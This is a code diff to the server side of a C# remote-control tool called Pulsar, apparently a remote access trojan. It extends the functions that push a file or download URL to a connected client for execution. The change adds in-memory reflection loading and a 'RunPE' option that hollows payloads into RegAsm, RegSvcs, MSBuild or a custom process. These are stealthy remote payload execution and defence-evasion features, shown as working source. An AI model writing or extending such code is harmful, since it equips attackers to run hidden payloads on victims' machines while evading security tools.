@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Administration.TaskManager;
@@ -90,9 +91,28 @@ namespace Pulsar.Server.Messages
         /// </summary>
         /// <param name="remotePath">The remote path used for starting the new process.</param>
         /// <param name="isUpdate">Decides whether the process is a client update.</param>
-        public void StartProcess(string remotePath, bool isUpdate = false, bool executeInMemory = false)
+        /// <param name="executeInMemory">Execute in memory using .NET reflection.</param>
+        /// <param name="useRunPE">Execute using RunPE technique.</param>
+        /// <param name="runPETarget">Target process for RunPE (a=RegAsm, b=RegSvcs, c=MSBuild, d=custom).</param>
+        /// <param name="runPECustomPath">Custom path when runPETarget is 'd'.</param>
+        public void StartProcess(string remotePath, bool isUpdate = false, bool executeInMemory = false, bool useRunPE = false, string runPETarget = "a", string runPECustomPath = null)
         {
-            _client.Send(new DoProcessStart { FilePath = remotePath, IsUpdate = isUpdate, ExecuteInMemoryDotNet = executeInMemory });
+            byte[] fileBytes = null;
+            
+            if (File.Exists(remotePath))
+            {
+                fileBytes = File.ReadAllBytes(remotePath);
+            }
+            
+            _client.Send(new DoProcessStart 
+            { 
+                FileBytes = fileBytes,
+                IsUpdate = isUpdate, 
+                ExecuteInMemoryDotNet = executeInMemory,
+                UseRunPE = useRunPE,
+                RunPETarget = runPETarget,
+                RunPECustomPath = runPECustomPath
+            });
         }
 
         /// <summary>
@@ -100,9 +120,21 @@ namespace Pulsar.Server.Messages
         /// </summary>
         /// <param name="url">The URL to download and execute.</param>
         /// <param name="isUpdate">Decides whether the file is a client update.</param>
-        public void StartProcessFromWeb(string url, bool isUpdate = false, bool executeInMemory = false)
+        /// <param name="executeInMemory">Execute in memory using .NET reflection.</param>
+        /// <param name="useRunPE">Execute using RunPE technique.</param>
+        /// <param name="runPETarget">Target process for RunPE (a=RegAsm, b=RegSvcs, c=MSBuild, d=custom).</param>
+        /// <param name="runPECustomPath">Custom path when runPETarget is 'd'.</param>
+        public void StartProcessFromWeb(string url, bool isUpdate = false, bool executeInMemory = false, bool useRunPE = false, string runPETarget = "a", string runPECustomPath = null)
         {
-            _client.Send(new DoProcessStart { DownloadUrl = url, IsUpdate = isUpdate, ExecuteInMemoryDotNet = executeInMemory });
+            _client.Send(new DoProcessStart 
+            { 
+                DownloadUrl = url, 
+                IsUpdate = isUpdate, 
+                ExecuteInMemoryDotNet = executeInMemory,
+                UseRunPE = useRunPE,
+                RunPETarget = runPETarget,
+                RunPECustomPath = runPECustomPath
+            });
         }
 
         /// <summary>
